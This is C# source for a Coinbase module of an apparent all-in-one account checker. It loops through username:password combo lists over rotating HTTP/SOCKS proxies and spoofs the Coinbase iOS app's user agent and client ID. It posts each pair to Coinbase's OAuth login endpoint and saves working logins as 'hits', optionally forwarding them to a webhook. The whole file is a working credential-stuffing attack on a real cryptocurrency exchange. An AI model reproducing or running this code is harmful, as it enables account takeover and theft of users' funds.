using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Coinbasemod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent =
                                "Coinbase/7.30.9 (com.vilcsak.bitcoin2; build:11666; iOS 13.6.0) Alamofire/4.9.1";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            var str =
                                "client_id=6011662b0badfa97f9fed5a246526277ff2116affa98cfaacacd012a191ba38d&password=" +
                                array[1] + "&redirect_uri=2_legged&scope=all&username=" + array[0];
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var strResponse = req.Post("https://api.coinbase.com/oauth/authorize/with-credentials", str,
                                "application/x-www-form-urlencoded; charset=utf-8").ToString();
                            {
                                if (strResponse.Contains("success\":false"))
                                {
                                    Program.TotalChecks++;
                                    Program.Fails++;
                                }
                                else if (strResponse.Contains("200"))
                                {
                                    Program.TotalChecks++;
                                    Program.Fails++;
                                }
                                else if (strResponse.Contains("success\":true"))
                                {
                                    Program.Hits++;
                                    Export.AsResult("/Coinbase_hits", array[0] + ":" + array[1]);
                                    Program.TotalChecks++;
                                    req.Dispose();
                                    if (Program.lorc == "LOG") Settings.PrintHit("Coinbase", array[0] + ":" + array[1]);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1], "Coinbase Hits");
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                            req.Dispose();
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}